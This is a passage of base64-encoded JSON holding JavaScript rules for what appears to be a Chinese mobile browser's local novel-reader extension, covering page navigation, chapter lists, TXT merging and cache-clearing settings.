FwiO1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCIucGFnZU51bVxcXCIsIFxcXCJcXFwiICsgaW5wdXROdW0pO1xcbiAgICAgICAgICAgIGNvbnN0IGJvb2tJbmZvID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiL2Jvb2tJbmZvLmpzb25cXFwiKSB8fCBcXFwie31cXFwiKTtcXG4gICAgICAgICAgICBib29rSW5mby5mb290ID0gaW5wdXROdW07XFxuICAgICAgICAgICAgd3JpdGVGaWxlKFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiL2Jvb2tJbmZvLmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgIH0sIHZpZXdQYWdlQ291bnQsIHBhZ2VOdW0sIHBhdGgpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzVcXFwiXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuS4iuS4gOmhtVxcXCIsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHBhZ2VOdW0sIHBhdGgpID0+IHtcXG4gICAgICAgICAgICBsZXQgaW5wdXROdW0gPSBwYWdlTnVtIC0gMTtcXG4gICAgICAgICAgICBpZiAoaW5wdXROdW0gPCAwKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7Lnu4/mmK/nrKzkuIDpobXkuoZcXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiLnBhZ2VOdW1cXFwiLCBcXFwiXFxcIiArIGlucHV0TnVtKTtcXG4gICAgICAgICAgICBjb25zdCBib29rSW5mbyA9IEpTT04ucGFyc2UocmVxdWVzdChcXFwiZmlsZTovL1xcXCIgKyBwYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIikgfHwgXFxcInt9XFxcIik7XFxuICAgICAgICAgICAgYm9va0luZm8uZm9vdCA9IGlucHV0TnVtO1xcbiAgICAgICAgICAgIHdyaXRlRmlsZShcXFwiZmlsZTovL1xcXCIgKyBwYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoYm9va0luZm8pKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0sIHBhZ2VOdW0sIHBhdGgpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzVcXFwiXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuS4i+S4gOmhtVxcXCIsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHZpZXdQYWdlQ291bnQsIHBhZ2VOdW0sIHBhdGgpID0+IHtcXG4gICAgICAgICAgICBsZXQgaW5wdXROdW0gPSBwYWdlTnVtICsgMTtcXG4gICAgICAgICAgICBpZiAoaW5wdXROdW0gPiB2aWV3UGFnZUNvdW50IC0gMSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey57uP5piv5pyA5ZCO5LiA6aG15LqGXFxcIjtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcIi5wYWdlTnVtXFxcIiwgXFxcIlxcXCIgKyBpbnB1dE51bSk7XFxuICAgICAgICAgICAgY29uc3QgYm9va0luZm8gPSBKU09OLnBhcnNlKHJlcXVlc3QoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIpIHx8IFxcXCJ7fVxcXCIpO1xcbiAgICAgICAgICAgIGJvb2tJbmZvLmZvb3QgPSBpbnB1dE51bTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICB9LCB2aWV3UGFnZUNvdW50LCBwYWdlTnVtLCBwYXRoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF81XFxcIlxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLmnKvpobVcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKCh2aWV3UGFnZUNvdW50LCBwYWdlTnVtLCBwYXRoKSA9PiB7XFxuICAgICAgICAgICAgbGV0IGlucHV0TnVtID0gdmlld1BhZ2VDb3VudCAtIDE7XFxuICAgICAgICAgICAgaWYgKHBhZ2VOdW0gPT09IGlucHV0TnVtIHx8IGlucHV0TnVtID09PSAtMSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey57uP5piv5pyA5ZCO5LiA6aG15LqGXFxcIjtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcIi5wYWdlTnVtXFxcIiwgXFxcIlxcXCIgKyBpbnB1dE51bSk7XFxuICAgICAgICAgICAgY29uc3QgYm9va0luZm8gPSBKU09OLnBhcnNlKHJlcXVlc3QoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIpIHx8IFxcXCJ7fVxcXCIpO1xcbiAgICAgICAgICAgIGJvb2tJbmZvLmZvb3QgPSBpbnB1dE51bTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCArIFxcXCIvYm9va0luZm8uanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICB9LCB2aWV3UGFnZUNvdW50LCBwYWdlTnVtLCBwYXRoKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF81XFxcIlxcbiAgICB9KTtcXG59IGVsc2Uge1xcbiAgICBjaGFwdGVyTGlzdCA9IG1obGlzdDtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIueroOiKgiBcXFwiLmJpZygpICsgKFxcXCLlhbHmnIk6XFxcIiArIGNoYXB0ZXJDb3VudCArIFxcXCLnq6BcXFwiKS5zbWFsbCgpLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChpc1JldmVyc2UpID0+IHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiLmlzUmV2ZXJzZVxcXCIsIGlzUmV2ZXJzZSA9PT0gXFxcIjBcXFwiID8gXFxcIjFcXFwiIDogXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSh0cnVlKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgICAgICB9LCBpc1JldmVyc2UpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiXFxuICAgIH0pO1xcbn1cXG5sZXQgYXJyYXkgPSBbXTtcXG5pZiAobW9kZSA9PT0gXFxcIjBcXFwiKSB7XFxuICAgIGZvciAobGV0IGl0ZW0gb2YgY2hhcHRlckxpc3QpIHtcXG4gICAgICAgIGxldCBuYW1lID0gZ2V0VGl0bGUoaXRlbS5uYW1lKTtcXG4gICAgICAgIGFycmF5LnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBuYW1lLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9Ob3ZlbE1haW5Cb2R5I2F1dG9QYWdlIyNyZWFkVGhlbWUjXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBwYXRoOiBpdGVtLnBhdGgsXFxuICAgICAgICAgICAgICAgIGRpclBhdGg6IHBhdGgsXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBuYW1lLFxcbiAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgY29sX3R5cGU6IENvbmZpZy5kZWZfVmlld19TdHlsZVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG59IGVsc2Uge1xcbiAgICBmb3IgKGxldCBpdGVtIG9mIGNoYXB0ZXJMaXN0KSB7XFxuICAgICAgICBsZXQgbmFtZSA9IGdldFRpdGxlKGl0ZW0ubmFtZSk7XFxuICAgICAgICBhcnJheS5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogbmFtZSxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIuehruiupOWIoOmZpFtcXFwiICsgbmFtZSArIFxcXCJd77yfXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcbiAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liKDpmaTlpLHotKVcXFwiO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSwgaXRlbS5wYXRoKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogQ29uZmlnLmRlZl9WaWV3X1N0eWxlXFxuICAgICAgICB9KTtcXG4gICAgfVxcbn1cXG5pZiAoaXNSZXZlcnNlID09PSBcXFwiMVxcXCIpIHtcXG4gICAgYXJyYXkucmV2ZXJzZSgpO1xcbn1cXG5sYXlvdXQucHVzaC5hcHBseShsYXlvdXQsIGFycmF5KTtcXG5zZXRSZXN1bHQobGF5b3V0KTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiN2LuWwj+ivtOato+aWh+mYheivu1wiLFwicGF0aFwiOlwiTm92ZWxNYWluQm9keVwiLFwicnVsZVwiOlwianM6XFxudmFyIGxheW91dCA9IFtdO1xcbmxldCBjb250ZW50ID0gcmVxdWVzdChcXFwiZmlsZTovL1xcXCIgKyBNWV9QQVJBTVMucGF0aCk7XFxuLy9jb250ZW50ID0gY29udGVudC5yZXBsYWNlKC9cXFxcbnxcXFxcci9nLCBcXFwiPGJyPlxcXCIpLnJlcGxhY2UoLygmbmJzcDspKy9nLFxcXCIgXFxcIik7XFxuY29uc3QgYm9va0luZm8gPSBPYmplY3QuYXNzaWduKHtcXG4gICAgc2VsZWN0ZWQ6IFtdLFxcbiAgICBpc1JlcGxhY2U6IGZhbHNlLFxcbiAgICBpc1NlZ21lbnQ6IHRydWUsXFxufSwgSlNPTi5wYXJzZShyZXF1ZXN0KFxcXCJmaWxlOi8vXFxcIiArIE1ZX1BBUkFNUy5kaXJQYXRoICsgXFxcIi9ib29rSW5mby5qc29uXFxcIikgfHwgXFxcInt9XFxcIikpO1xcblxcbmlmIChib29rSW5mby5pc1JlcGxhY2UpIHtcXG4gICAgbGV0IGphdmFTdHJpbmcgPSBqYXZhLmxhbmcuU3RyaW5nKGNvbnRlbnQpO1xcbiAgICBsZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcIikgfHwgXFxcIltdXFxcIik7XFxuICAgIGxldCByZXBsYWNlUGF0dGVybiA9IFtcXFwicmVwbGFjZVxcXCIsIFxcXCJyZXBsYWNlQWxsXFxcIl07XFxuICAgIGZvciAobGV0IGkgPSAwLCBsZW4gPSBydWxlTGlzdC5sZW5ndGg7IGkgPCBsZW47IGkrKykge1xcbiAgICAgICAgbGV0IHJlcGxhY2VSdWxlID0gcnVsZUxpc3RbaV07XFxuICAgICAgICBpZiAoIWJvb2tJbmZvLnNlbGVjdGVkLmluY2x1ZGVzKHJlcGxhY2VSdWxlLmlkKSkge1xcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IHJlcGxhY2UgPSByZXBsYWNlUGF0dGVyblswICsgcmVwbGFjZVJ1bGUuaXNSZWdleF07XFxuICAgICAgICBqYXZhU3RyaW5nID0gamF2YVN0cmluZ1tyZXBsYWNlXShyZXBsYWNlUnVsZS5wYXR0ZXJuLCByZXBsYWNlUnVsZS5yZXBsYWNlbWVudCk7XFxuICAgIH1cXG4gICAgY29udGVudCA9IFN0cmluZyhqYXZhU3RyaW5nKTtcXG59XFxuaWYgKGJvb2tJbmZvLmlzU2VnbWVudCkge1xcbiAgICBjb250ZW50ID0gXFxcIuOAgOOAgFxcXCIgKyBjb250ZW50LnNwbGl0KC8oXFxcXG58XFxcXHIpKy8pLmZpbHRlcihpdCA9PiBpdC50cmltKCkubGVuZ3RoID4gMSkubWFwKGl0ID0+IGl0LnRyaW0oKSkuam9pbihcXFwiPGJyPuOAgOOAgFxcXCIpO1xcbn1cXG5sYXlvdXQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIixcXG4gICAgdGl0bGU6IChcXFwiPHN0cm9uZz5cXFwiICsgTVlfUEFSQU1TLnRpdGxlICsgXFxcIjwvc3Ryb25nPlxcXCIpLmJpZygpLFxcbn0pO1xcblxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IGNvbnRlbnQsXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHRleHRTaXplOiAxOCxcXG4gICAgICAgIGNsaWNrOiB0cnVlXFxuICAgIH1cXG59KTtcXG5zZXRSZXN1bHQobGF5b3V0KTtcIn0se1wiY29sX3R5cGVcIjpcInRleHRfMVwiLFwibmFtZVwiOlwiI3Yu5ZCI5bm2VFhUXCIsXCJwYXRoXCI6XCJOb3ZlbENvbGxlY3RlZC52aWV3XCIsXCJydWxlXCI6XCJqczpcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcbmxldCBydWxlbERpciA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnLm5vdmVsRnVsbFBhdGgsIFxcXCJkaXJcXFwiKTtcXG5zZXRQYWdlVGl0bGUoXFxcIuWQiOW5tlRYVFxcXCIpO1xcbmxldCBsYXlvdXQgPSBbXTtcXG5cXG5mdW5jdGlvbiBvcGVyYXRpb24ocGF0aCkge1xcbiAgICBzd2l0Y2ggKGlucHV0KSB7XFxuICAgICAgICBjYXNlIFxcXCLliIbkuqtcXFwiOlxcbiAgICAgICAgICAgIHJldHVybiBcXFwic2hhcmU6Ly9cXFwiICsgcGF0aDtcXG4gICAgICAgICAgICBicmVhaztcXG4gICAgICAgIGNhc2UgXFxcIuWIoOmZpFxcXCI6XFxuICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcIjtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICBjYXNlIFxcXCLmtbfpmJTpooTop4hcXFwiOlxcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3R4dFBhcnNlci52aWV3XFxcIjtcXG4gICAgICAgICAgICBicmVhaztcXG4gICAgICAgIGNhc2UgXFxcIuaJk+W8gOaWueW8j1xcXCI6XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJvcGVuRmlsZTovL2ZpbGU6Ly9cXFwiICsgcGF0aDtcXG4gICAgICAgICAgICBicmVhaztcXG4gICAgfVxcbn1cXG5mb3IgKGxldCBydWxlUGF0aHMgb2YgcnVsZWxEaXIpIHtcXG4gICAgbGV0IG5vdmVscyA9IEZpbGUuZ2V0RmlsZVBhdGgocnVsZVBhdGhzLnBhdGgsIFxcXCJmaWxlXFxcIiwgXFxcIi50eHRcXFwiKTtcXG4gICAgZm9yIChsZXQgbm92ZWwgb2Ygbm92ZWxzKSB7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IG5vdmVsLm5hbWUsXFxuICAgICAgICAgICAgdXJsOiAkKFtcXFwi5YiG5LqrXFxcIiwgXFxcIuWIoOmZpFxcXCIsIFxcXCLmtbfpmJTpooTop4hcXFwiLCBcXFwi5omT5byA5pa55byPXFxcIl0sIDEpLnNlbGVjdChvcGVyYXRpb24sIG5vdmVsLnBhdGgpLFxcbiAgICAgICAgICAgIGRlc2M6IFxcXCLmnaXmupDvvJpcXFwiICsgcnVsZVBhdGhzLm5hbWUsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIHBhdGg6IG5vdmVsLnBhdGhcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcbn1cXG5pZiAobGF5b3V0Lmxlbmd0aCA9PT0gMCkge1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogJzxoMSBzdHlsZT1cXFwidGV4dC1hbGlnbjogY2VudGVyO1xcXCI+5ZWl6YO95rKh5pyJ6IC2PC9oMT4nLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxuICAgIH0pO1xcbn1cXG5zZXRSZXN1bHQobGF5b3V0KTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiN2LuabtOWkmuiuvue9rlwiLFwicGF0aFwiOlwiU2V0dGluZy9Nb3JlLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuXFxuY29uc3Qgc2V0dGluZ1R5cGUgPSBNWV9QQVJBTVMuc2V0dGluZ1R5cGUgfHwgZ2V0UGFyYW0oXFxcInNldHRpbmdUeXBlXFxcIik7XFxuXFxubGV0IGxheW91dCA9IFtdO1xcbmxldCBpZCA9IFxcXCIjXFxcIiArIG5ldyBEYXRlKCkuZ2V0VGltZSgpO1xcbnN3aXRjaCAoc2V0dGluZ1R5cGUpIHtcXG4gICAgY2FzZSBcXFwiY2FjaGVcXFwiOlxcbiAgICAgICAgc2V0UGFnZVRpdGxlKFxcXCLmuIXpmaTnvJPlrZh86K6+572uXFxcIik7XFxuICAgICAgICBjb25zdCBrbm93bkxpc3QgPSBuZXcgTWFwKFtcXG4gICAgICAgICAgICBbRmlsZS5nZXROYW1lKENvbmZpZy5ub3ZlbFBhdGgpLCBcXFwiI+euoeeQhuWZqCPlsI/or7TnvJPlrZjnm67lvZVb5LiN5bu66K6u5riF6ZmkXVxcXCJdLFxcbiAgICAgICAgICAgIFtGaWxlLmdldE5hbWUoQ29uZmlnLmNvbWljUGF0aCksIFxcXCIj566h55CG5ZmoI+a8q+eUu+e8k+WtmOebruW9lVvkuI3lu7rorq7muIXpmaRdXFxcIl0sXFxuICAgICAgICAgICAgW0ZpbGUuZ2V0TmFtZShDb25maWcuZXh0ZXJuYWxJbXBvcnRQYXRoKSwgXFxcIiPnrqHnkIblmagj5a+85YWl55qEVFhU55uu5b2VW+S4jeW7uuiurua4hemZpF1cXFwiXSxcXG4gICAgICAgICAgICBbRmlsZS5nZXROYW1lKENvbmZpZy5ub3ZlbEZ1bGxQYXRoKSwgXFxcIiPnrqHnkIblmagj5bCP6K+05ZCI5bm255uu5b2VW+WPr+S7pea4hemZpF1cXFwiXSxcXG4gICAgICAgICAgICBbXFxcImRy56ug6IqC57yT5a2YXFxcIiwgXFxcIumBk+mVv+aooeadv+S4tOaXtue8k+WtmFvlu7rorq7muIXpmaRdXFxcIl1cXG4gICAgICAgIF0pO1xcblxcbiAgICAgICAgbGV0IGNhY2hlRGlyID0gRmlsZS5nZXRGaWxlUGF0aChDb25maWcuaG9tZVBhdGgsIFxcXCJkaXJcXFwiKTtcXG5cXG4gICAgICAgIGZ1bmN0aW9uIGNsZWFuQ2FjaGUocGF0aCkge1xcbiAgICAgICAgICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuICAgICAgICAgICAgaWYgKEZpbGUuZGVsZXRlRmlsZXMocGF0aCkpIHtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5riF6Zmk5a6M5oiQXFxcIjtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5riF6Zmk5aSx6LSlXFxcIjtcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICBmb3IgKGxldCBjYWNoZSBvZiBjYWNoZURpcikge1xcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGNhY2hlLm5hbWUsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLlpKflsI/vvJpcXFwiICsgRmlsZS5nZXRGaWxlU2l6ZShjYWNoZS5wYXRoKSArIFxcXCJcXFxcbuaPj+i/sO+8mlxcXCIgKyAoa25vd25MaXN0LmdldChjYWNoZS5uYW1lKSB8fCBcXFwi5pyq55+l55uu5b2VW+mjjumZqeacquefpV1cXFwiKSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoXFxcIuehruiupOa4hemZpCBcXFwiICsgY2FjaGUubmFtZSArIFxcXCIgP1xcXCIpLmNvbmZpcm0oY2xlYW5DYWNoZSwgY2FjaGUucGF0aClcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxuICAgICAgICB9KTtcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuWFqOmDqOa4hemZpChcXFwiICsgRmlsZS5nZXRGaWxlU2l6ZShDb25maWcuaG9tZVBhdGgpICsgXFxcIilcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgdXJsOiAkKFxcXCLnoa7orqTmuIXpmaTlhajpg6jnvJPlrZjmlbDmja4/XFxcIikuY29uZmlybShjbGVhbkNhY2hlLCBDb25maWcuaG9tZVBhdGgpXFxuICAgICAgICB9KTtcXG4gICAgICAgIGJyZWFrO1xcbiAgICBjYXNlIFxcXCJkZWZhdWx0UGljXFxcIjpcXG4gICAgICAgIHNldFBhZ2VUaXRsZShcXFwi6buY6K6k5bCB6Z2ifOiuvue9rlxcXCIpO1xcbiAgICAgICAgaWYgKGdldE15VmFyKFxcXCI6ZGVmYXVsdFBpY0JhY2tcXFwiKSkge1xcbiAgICAgICAgICAgIGJhY2soKTtcXG4gICAgICAgICAgICBjbGVhck15VmFyKFxcXCI6ZGVmYXVsdFBpY0JhY2tcXFwiKTtcXG4gICAgICAgICAgICBicmVhaztcXG4gICAgICAgIH1cXG5cXG4gICAgICAgIGZ1bmN0aW9uIHNldERlZmF1bHRQaWModXJsKSB7XFxuICAgICAgICAgICAgbGV0IENvbmZpZyA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgMCkgfHwgXFxcInt9XFxcIik7XFxuICAgICAgICAgICAgQ29uZmlnLmRlZl9QaWMgPSB1cmw7XFxuICAgICAgICAgICAgc2F2ZUZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgSlNPTi5zdHJpbmdpZnkoQ29uZmlnKSwgMCk7XFxuICAgICAgICAgICAgYmFjaygpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/kv67mlLnmiJDlip9cXFwiO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IHN0YXJ0ID0gMTtcXG4gICAgICAgIGlmICh0eXBlb2YoTVlfTkFNRSkgIT09IFxcXCJ1bmRlZmluZWRcXFwiICYmIE1ZX05BTUUgPT09IFxcXCLll4Xop4nmtY/op4jlmahcXFwiKSB7XFxuICAgICAgICAgICAgc3RhcnQgPSA0O1xcbiAgICAgICAgfWVsc2V7XFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuWbvueJh2xhdGVcXFwiLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcIm1vdmllXzNcXFwiLFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBcXFwiaGlrZXI6Ly9pbWFnZXMvaG9tZV9sYXRlXFxcIixcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKHNldERlZmF1bHRQaWMsIFxcXCJoaWtlcjovL2ltYWdlcy9ob21lX2xhdGVcXFwiKVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcblxcbiAgICAgICAgZm9yIChsZXQgaSA9IHN0YXJ0OyBpIDw9IDQ7IGkrKykge1xcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLlm77niYdcXFwiICsgaSxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJtb3ZpZV8zXFxcIixcXG4gICAgICAgICAgICAgICAgcGljX3VybDogXFxcImhpa2VyOi8vaW1hZ2VzL2hvbWVfcGljXFxcIiArIGksXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShzZXREZWZhdWx0UGljLCBcXFwiaGlrZXI6Ly9pbWFnZXMvaG9tZV9waWNcXFwiICsgaSlcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuiHquWumuS5ieKelVxcXCIsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbiAgICAgICAgICAgIHVybDogJChbXFxcIuiHquWumuS5iXVybFxcXCIsIFxcXCLpgInmi6nmlofku7bot6/lvoRcXFwiXSkuc2VsZWN0KCgpID0+IHtcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSBcXFwi6Ieq5a6a5LmJdXJsXFxcIikge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQoXFxcIlxcXCIsIFxcXCLovpPlhaXlm77niYfnmoTot6/lvoTmiJbogIXpk77mjqVcXFwiKS5pbnB1dCgoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IENvbmZpZyA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcImNvbmZpZy5qc29uXFxcIiwgMCkgfHwgXFxcInt9XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLmRlZl9QaWMgPSBpbnB1dDtcXG4gICAgICAgICAgICAgICAgICAgICAgICBzYXZlRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShDb25maWcpLCAwKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBiYWNrKCk7XFx